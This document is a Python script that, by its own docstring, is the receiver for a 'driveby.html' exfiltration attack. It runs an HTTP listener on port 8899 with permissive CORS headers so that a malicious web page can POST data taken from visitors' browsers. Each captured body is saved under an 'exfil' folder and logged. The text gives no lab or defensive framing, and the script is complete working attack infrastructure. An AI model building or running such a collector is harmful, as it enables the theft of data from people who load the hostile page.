#!/usr/bin/env python3
"""Receiver for driveby.html exfil. Saves each POST body to ./exfil/."""
import os
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exfil")
os.makedirs(OUT, exist_ok=True)


class H(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "content-type")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")

    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n)
        name = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime()) + "-" + str(len(os.listdir(OUT)))
        path = os.path.join(OUT, name + ".json")
        with open(path, "wb") as f:
            f.write(body)
        print("[+] %s %s bytes -> %s" % (self.path, len(body), path), flush=True)
        self.send_response(200); self._cors(); self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    print("[*] listening 0.0.0.0:8899, exfil ->", OUT, flush=True)
    HTTPServer(("0.0.0.0", 8899), H).serve_forever()
